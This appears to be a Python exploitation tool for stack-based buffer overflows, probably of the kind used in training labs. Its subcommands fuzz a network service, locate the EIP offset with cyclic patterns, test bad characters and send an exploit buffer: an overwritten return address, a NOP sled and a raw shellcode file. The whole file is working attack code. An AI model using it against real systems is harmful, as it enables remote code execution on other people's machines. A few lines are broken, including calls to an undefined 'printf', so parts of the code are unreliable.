#!/usr/bin/env python3.10

import socket, time, sys, base64, argparse, os


# argparse helpers
def file_path(path):
    if os.path.isfile(path):
        return path
    else:
        raise argparse.ArgumentTypeError(f"File path:{path} is not valid")

def eip(eip):
    return bytearray.fromhex(eip)[::-1]

def to_bytes(string):
    return bytes(string, "latin-1")
# args parsing
## Main Argument parser
main_parser = argparse.ArgumentParser(description='A rough buffer overflow tool for simple stack based buffer overflows. Run one of the positional argument modes with -h for more details')
main_parser.add_argument('-B','--hide-banner', action='store_true')

## Subparsers
sub_parsers = main_parser.add_subparsers(dest='command')

### Subparser parent for anything sending
send_parent_parser = argparse.ArgumentParser(add_help=False)
send_parent_parser.add_argument('-t',
        '--target',
        type=str,
        required=True,
        help='(required) Target IP address or hostname')
send_parent_parser.add_argument('-p',
        '--port',
        type=int,
        required=True,
        help='(required) Target port')
send_parent_parser.add_argument('-P',
        '--prefix',
        type=to_bytes,
        default=b'',
        required=False,
        help='Buffer prefix')
send_parent_parser.add_argument('-c',
        '--char',
        type=to_bytes,
        default=b'A',
        help='Buffer character (default: A)')
send_parent_parser.add_argument('-T',
        '--timeout',
        type=int,
        default=5,
        help='Timeout in seconds (default: 5)')
send_parent_parser.add_argument('-f',
        '--postfix',
        type=to_bytes,
        default=b'',
        help='Postfix string')

### Subparser parent for pattern related tasks
pattern_parent_parser = argparse.ArgumentParser(add_help=False)
pattern_parent_parser.add_argument('-l',
        '--length',
        type=int,
        required=True,
        help='(required) Pattern length in bytes')

### Subparser parent for anything controlling EIP
control_parent_parser = argparse.ArgumentParser(add_help=False)
control_parent_parser.add_argument('-o',
        '--offset',
        type=int,
        required=True,
        help='(required) Buffer size required to rewrite EIP in bytes')
control_parent_parser.add_argument('-e',
        '--eip',
        type=eip,
        default="42424242",
        help='EIP in hex (big endian) (default: 42424242)')

### Subparser parent for BadChar tasks
badchars_parent_parser = argparse.ArgumentParser(add_help=False)
badchars_parent_parser.add_argument('-b',
        '--badchars',
        type=str,
        required=True,
        nargs='+',
        default=['00'],
        help='(required) List of known bad characters hexcode, separated by space. eg. "00 01 04" (default: 00)')


### Subparser for fuzz
fuzz_parser = sub_parsers.add_parser('fuzz',parents=[send_parent_parser],description='Fuzzer to send payloads of increasing sizes to the target.')
fuzz_parser.add_argument('-s',
        '--step',
        type=int,
        default=100,
        help='Number of bytes to increase buffer by each fuzz (default: 100)')
fuzz_parser.add_argument('-b',
        '--begin',
        type=int,
        default=100,
        help='Start buffer size in bytes (default: 100)')
fuzz_parser.add_argument('-e',
        '--end',
        type=int,
        required=False,
        help='Max buffer size to fuzz in bytes')
fuzz_parser.add_argument('-S',
        '--sleep',
        type=int,
        default=1,
        help='Sleep time in seconds between each fuzz (default: 1)')


### Subparser for pattern-find
pattern_find_parser = sub_parsers.add_parser('pattern-find',
        parents=[pattern_parent_parser],
        description='Find index of hex pattern from cyclical payload pattern')
pattern_find_parser.add_argument('-q',
        '--query',
        type=str,
        required=True,
        help='(required) String to search for')

### Subparser for pattern-create
pattern_create_parser = sub_parsers.add_parser('pattern-create',
        parents=[pattern_parent_parser],
        description='Create cyclical pattern of a specific length')

### Subparser for pattern-send
pattern_send_parser = sub_parsers.add_parser('pattern-send',
        parents=[send_parent_parser,pattern_parent_parser],
        description='Send cyclical pattern of a specific length to target')

### Subparser for badchars-send
send_badchars_parser = sub_parsers.add_parser('badchars-send',
        parents=[send_parent_parser,control_parent_parser,badchars_parent_parser],
        description='Send BadChar array to target')

### Subparser for badchars-create
create_badchars_parser = sub_parsers.add_parser('badchars-create',
        parents=[badchars_parent_parser],
        description='Create BadChar array')

### Subparser for payload-send
send_payload_parser = sub_parsers.add_parser('payload-send',
        parents=[send_parent_parser,control_parent_parser],
        description='Exploit buffer overflow and send payload')

send_payload_parser.add_argument('-x',
        '--payload',
        type=file_path,
        required=True,
        help='(required) Path to raw payload file eg. created by msfvenom -f raw')
send_payload_parser.add_argument('-n',
        '--padding',
        type=int,
        default=16,
        help='Size of nop sled in bytes (default 16)')

args = main_parser.parse_args()


 
version = '0.1'


def stat_patt(pos):
    stat_turn = ["|","/","-","\\"]
    return stat_turn[pos%len(stat_turn)]
    

def banner():
    print(f" ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~")
    print(f"|                            _   _ |")
    print(f"| ._ _       _  |_  |_     _|_ _|_ |")
    print(f"| | (_) |_| (_| | | |_) |_| |   |  |")
    print(f"|            _|                    |")
    print(f"|==================================|")
    print(f"|Simple Stack-based Buffer Overflow|")
    print(f"|              v{version}{(5 - len(version)) * ' '} by delfino   |")
    print(f" ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n")

def check_host():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        try:
            print(f"[-] Target: {args.target}:{args.port}")
            print(f"[*] Checking target")
            s.settimeout(args.timeout)
            s.connect((args.target, args.port))
            rec = s.recv(1024)
            print(f"[+] Connected successfully")
            print(f"    Banner: {rec}\n")
        except:
            print(f"\n[!] Could not connect to target")
            return False
        return True        

def send_buffer(buff, recv = False):
    if type(buff) is str:
        buff = bytes(buff, "latin-1")
    buff = args.prefix + buff + bytes("\r\n", "latin-1") + args.postfix
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.settimeout(args.timeout)
        s.connect((args.target, args.port))
        s.recv(1024)
        s.send(buff)
        if recv:
            s.recv(1024)


def fuzz(buffmin, buffinc, buffchar, sleep):
    print(f"[-] Start: {buffmin} | Step: {buffinc} | Char: {buffchar}")
    buff = buffchar * buffmin
    i = 0
    while True:
        try:
            print(f"\r[{stat_patt(i)}] Fuzzing with {len(buff)} bytes",end="",flush=True)
            send_buffer(buff = buff,
                    recv = True)
            i += 1
        except:
            print(f"\n[+] Fuzzing crashed at {len(buff)} bytes. Check your debugger")
            return len(buff)
        buff += buffinc * buffchar
        time.sleep(sleep)


def create_pattern(length):
    print(f"[*] Creating pattern {length} bytes long")
    pattern_ref = ""
    for c1 in range(65, 91):
        for c2 in range(97, 123):
            for c3 in range(48, 58):
                for c in [c1,c2,c3]:
                    if len(pattern_ref) < length:
                        pattern_ref = pattern_ref + chr(c)
    return pattern_ref

def find_pattern(pattern_query,length):
    print(f"[-] Query: {pattern_query} | In length: {length}")
    pattern_ref = create_pattern(length) 
    pattern_lookup = (bytes.fromhex(pattern_query)).decode("ASCII")[::-1]
    try:
        pattern_match = pattern_ref.index(pattern_lookup)
        print(f"\n[+] Found at: {pattern_match}")
        return pattern_match
    except:
        print(f"\n[!] Could not find pattern")

def send_pattern(length):
    buff = create_pattern(length = length)
    try:
        print(f"[*] Sending cyclical pattern of {length} bytes")
        send_buffer(buff = buff)
        print(f"\n[+] Pattern sent. Check your debugger")
    except:
        print("\n[!] Could not send pattern")


def create_badchars(badchars):
    print(f"[-] Known BadChars: {badchars}")
    print(f"[*] Creating BadChar array")
    chars = ""
    for x in range(1, 256):
        char = f"{x:02x}"
        if char not in badchars:
            chars += char
    charset = bytearray.fromhex(chars)
    return charset


def send_badchars(badchars, buffchar, retn, offset):
    charset = create_badchars(badchars)
    buff = (buffchar * offset) + retn + charset 
    try:
        print(f"[*] Sending BadChar array")
        send_buffer(buff = buff)
        print(f"\n[+] Array sent. Check your debugger")
    except:
        print(f"\n[!] Unable to send BadChars")



def send_payload(payload_file, buffchar, retn, offset, padding):
    print(f"[-] Payload: {payload_file} | Padding: {padding} | EIP: {retn}")
    print(f"    Offset: {offset} | Character: {buffchar}")
    with open(payload_file, "rb") as f:
        payload = f.read()
    buff = (buffchar * offset) + retn + (padding * b"\x90") + payload
    try:
        print(f"[*] Sending payload")
        send_buffer(buff = buff)
        print(f"\n[+] Payload sent")
    except:
        print(f"\n[!] Unable to send payload")




def main():
    if not args.hide_banner:
        banner()
    print(f"[-] Mode: {args.command}")
    match args.command:
        case "fuzz":
            if check_host():
                fuzz(buffmin = args.begin,
                       buffinc = args.step,
                       buffchar = args.char,
                       sleep = args.sleep)
        case "pattern-create":
            pattern = create_pattern(length = args.length)
            printf("[*]Cyclical pattern:\npattern")
        case "pattern-find":
            find_pattern(pattern_query = args.query,
                    length = args.length)
        case "pattern-send":
            send_pattern(length = args.length)
        case "badchars-send":
            send_badchars(badchars = args.badchars,
                    buffchar = args.char,
                    retn = args.eip,
                    offset = args.offset)
        case "badchars-create":
            charset = create_badchars(badchars = args.badchars)
            printf("[*]Bad Chars:")
            print('\\x'+'\\x'.join(f"{c:0>2x}" for c in charset))
        case "payload-send":
            send_payload(payload_file = args.payload,
                    buffchar = args.char,
                    retn = args.eip,
                    offset = args.offset,
                    padding = args.padding)

if __name__ == '__main__':
    main()
